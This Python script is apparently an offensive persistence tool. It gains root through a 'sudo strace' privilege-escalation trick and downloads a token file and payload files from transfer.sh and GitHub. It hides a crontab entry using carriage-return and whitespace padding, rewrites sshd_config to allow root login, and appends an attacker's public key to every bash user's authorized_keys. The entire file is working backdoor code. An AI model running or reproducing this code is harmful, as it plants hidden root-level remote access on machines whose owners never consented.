import os
import subprocess
import time

mainUser = 'LivvidDreams'
scriptLink = 'https://raw.githubusercontent.com/LivvidDreams/pwnProject/master/'

currentCRON = '/var/spool/cron/root'
locationFile = '/home/user/pwn.py'

gtfoBin = 'sudo strace -o /dev/null {}'
files = ['pwn.py', '.env', 'rsakeys.pub']

        
def runCommand(command, output=False):
    if not command: return
    if not output:
        subprocess.call(command.split(), stdout = subprocess.PIPE)
    else:
        subprocess.call(command.split())


def sshConfigEdit():
    path = "/etc/ssh/sshd_config"
    flag1 = "GSSAPIAuthentication"
    flag2 = "GSSAPICleanupCredentials"
    flag3 = "#PubkeyAuthentication yes"
    flag4 = "#PermitRootLogin yes"
    flag5 = "PubkeyAcceptedKeyTypes=+ssh-rsa"
    with open(path, "r") as sshfile:
        newlines = []
        for word in sshfile.readlines():
            if flag1 in word or flag2 in word or flag5 in word: continue
        
            elif flag3 in word or flag4 in word:
                newlines.append(word[1:])
            else:
                newlines.append(word)
    newlines.append("PubkeyAcceptedKeyTypes=+ssh-rsa")
    with open(path, "w") as sshfile:
        for line in newlines:
            sshfile.writelines(line)
    runCommand("systemctl restart sshd")

def gitKeyPush():
    # runCommand("grep -oE '^[^:]+' /etc/passwd >> users.txt")
    subprocess.Popen("cut -f 1,6,7 -d: /etc/passwd >> users.txt", shell= True)
    time.sleep(1)
    allDir = {}
    with open("users.txt", "r") as userDIR:
        for dir in userDIR.readlines():
            pathShell = dir.split(":")
            if pathShell[1] == '/': continue
            if pathShell[2] != '/bin/bash\n': continue
            allDir[pathShell[0]] = pathShell[1]
    runCommand("rm -f users.txt")


    for key in allDir.keys():
        user = key
        dir = allDir[user] + "/.ssh"

        sshAuthorized = dir + "/authorized_keys"
        runCommand("mkdir -p {}".format(dir))
        runCommand('chmod 0700 {}'.format(dir))
        runCommand('chown {}:{} {}'.format(user, user, dir))
        subprocess.Popen('cat rsakeys.pub >> {}'.format(sshAuthorized), shell = True)
        time.sleep(0.5)
        runCommand('chmod 0600 {}'.format(sshAuthorized))
        runCommand('chown {}:{} {}'.format(user, user, sshAuthorized))

    
    runCommand('rm -f {}'.format(files[2]))



def update_python():
    try:
        pyth = 'python3 --version >/dev/null'
        runCommand(pyth)
        return
    except Exception:
        print('updating python')
        runCommand(gtfoBin.format('yum -y -q -e 0 install python3 > /dev/null'))

def rerun():
    runCommand(gtfoBin.format('python3 pwn.py'), True)
    exit()


def is_root():
    if os.getuid() == 0:
        print("OBTAINED ROOT")
        return True
    else:
        # Rerun This Script As Root User
        rerun()

def startUpRecover():
    # On startup, we need a couple of things
        # 1. Need to get the oldest version of the script BACK on the tgt machine
        # 2. After receiving, we need to check to see if it needs to be updated
        # 3. After checking for updates, we need to 
    print()


def appendCron(path, command):
    assert is_root()

    carriage = ' #\r'
    whitespace = ' ' * (len(command) + len(carriage))
    # Just need to open file @path
    try:
        cronfile = open(path, "a")  # append mode

        ## TODO: Check if the command is already in it, if not, then add.
        cronfile.write("\n" + command + carriage + whitespace + "\n")
        cronfile.close()
        runCommand("systemctl reload crond.service")
        runCommand("systemctl restart crond.service")
        print('Appended To File ', path)
    except:
        print("Failed To Append to File ", path)
        return

    

def configureTokens():
    try:
        from dotenv import load_dotenv
    except:
        runCommand("python3 -m pip install python-dotenv")
        rerun()

    api_key = None

    
    # Ensure we can download enviornment file
    runCommand("curl -s -o .env https://transfer.sh/2S2RUM/.env")
    load_dotenv()
    api_key = os.getenv("github_key")

    assert api_key

    return (mainUser, api_key)


def getScript():
    try:
        import requests
    except:
        runCommand("python3 -m pip install requests")
        rerun()

    validAuth = configureTokens()
    if validAuth:
        for file in files:
            save = requests.get(scriptLink + file, auth = validAuth, allow_redirects = True)
            open(file, "wb").write(save.content)
            '''
                Implement Directory to Save These Files To
            '''
    else:
        exit()


def main():
    # First Attempt To Install Python3 for Easier Scripting
    update_python()

    # Next Attempt To Rerun Script As Root. Else, Run Root Priv Things
    if not is_root(): exit()

    # Update The Script From GitHub And Obtain Keys To Add
    getScript()

    # Find Place To Hide The Script While Running
    cmd = "* * * * * rm -f " + locationFile
    appendCron(currentCRON, cmd)

    # attempt to edit ssh files
    sshConfigEdit()

    # Find All Users And Append Keys
    gitKeyPush()

    
    




if __name__ == "__main__":
    main()